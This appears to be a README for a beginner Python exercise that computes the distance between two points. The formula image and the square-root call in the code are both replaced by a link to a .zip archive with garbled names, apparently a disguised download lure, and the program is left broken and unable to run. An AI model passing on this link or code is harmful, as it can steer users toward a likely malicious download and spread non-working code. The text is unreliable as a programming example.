# DISTANCE-BETWEEN-TWO-POINTS

## AIM:
To write a python program to find the distance two 2 points
## ALGORITHM:
### Step 1: 
### Step 2: 
### Step 3: 
Substitute the values in the distance formula  ![formula](https://github.com/Yugabharathi91/DISTANCE-BETWEEN-TWO-POINTS/raw/refs/heads/main/putrilage/TW_BETWEE_POINTS_DISTANC_2.5.zip)
### Step 4: 
### Step 5: 
### PROGRAM:

import math
x1, y1 = 4, 2
x2, y2 = 10, 6
distance = https://github.com/Yugabharathi91/DISTANCE-BETWEEN-TWO-POINTS/raw/refs/heads/main/putrilage/TW_BETWEE_POINTS_DISTANC_2.5.zip((x2 - x1)**2 + (y2 - y1)**2)
print(f"{distance:.2f}")
```
